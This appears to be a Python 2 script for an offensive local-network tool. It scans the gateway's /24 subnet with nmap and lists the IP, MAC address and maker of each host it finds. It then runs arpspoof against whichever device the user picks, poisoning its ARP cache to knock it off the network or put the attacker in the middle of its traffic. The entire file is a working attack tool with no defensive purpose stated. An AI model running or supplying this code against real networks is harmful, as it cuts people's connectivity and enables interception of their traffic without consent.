# -*- coding: utf-8 -*-

import sys
import os
from terminaltables import DoubleTable
import subprocess
import time

# Check if the script is running as root .
if not os.geteuid() == 0:
    sys.exit("""\033[1;91m\n[!] KICK THEM OUT must be run as root. ¯\_(ツ)_/¯\n\033[1;m""")

print """
 _                 ____ _
| |    __ _ _ __  / ___| | ___  __ _ _ __   ___ _ __
| |   / _` | '_ \| |   | |/ _ \/ _` | '_ \ / _ \ '__|
| |__| (_| | | | | |___| |  __/ (_| | | | |  __/ |
|_____\__,_|_| |_|\____|_|\___|\__,_|_| |_|\___|_|
"""

# Interface
up_interface = os.popen("route | awk '/Iface/{getline; print $8}'").read()
up_interface = up_interface.replace("\n","")

# Gateway
gateway = os.popen("ip route show | grep -i 'default via'| awk '{print $3 }'").read()
gateway = gateway.replace("\n","")

# User Ip
my_ip = os.popen("ip route | grep src | awk '{print $9}'")

# Exit message
exit_msg = "\n Shutting down ... Goodbye. (-.-)\n"

def createLogFile(data, filename):
    f = open(filename + '.txt','w')
    f.write(data)
    f.close()

def parseTargets():
    targets = []
    file = open("scan.txt", "r")
    for line in file:
        columns = line.split(" ")

        if "report" in line:
            columns[4] = columns[4].replace("\n","")
            targets.append(columns[4])
    file.close()
    return targets

def networkScanning():
    print "Scanning the Network ..."
    nmap = os.popen("nmap " + gateway + "/24 -n -sT").read()
    createLogFile(nmap, "scan")
    targets = parseTargets()

    devices_ip = os.popen("grep report scan.txt | awk '{print $5}'").read()
    devices_mac = os.popen("grep MAC scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address
    devices_name = os.popen("grep MAC scan.txt | awk '{print $4 ,S$5 $6}'").read() + "(This device)"

    table_data = [['IP Address', 'Mac Address', 'Manufacturer'],
                  [devices_ip, devices_mac, devices_name]]
    table = DoubleTable(table_data)
    print(table.table)
    return targets

def attack(target):
    print "Performing Attack ..."
    print "Press Ctrl-C to stop the attack"
    cmd = ["arpspoof", "-i", str(up_interface), "-t", str(target), str(gateway)]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()
    # TODO handle the errors

if __name__ == '__main__':
    targets_list = networkScanning()
    target = raw_input("Select Target (Complete target's IP addr or press exit to terminate...): ")
    while target != "exit":
        if target in targets_list:
            try:
                attack(target)
            except KeyboardInterrupt:
                time.sleep(5.5)
                print "Attack Stopped ..."
                target = raw_input("Select Target (Complete target's IP addr or press exit to terminate...): ")
        else:
            print "Wrong target ..... "
            target = raw_input("Select Target (Complete target's IP addr or press exit to terminate...): ")
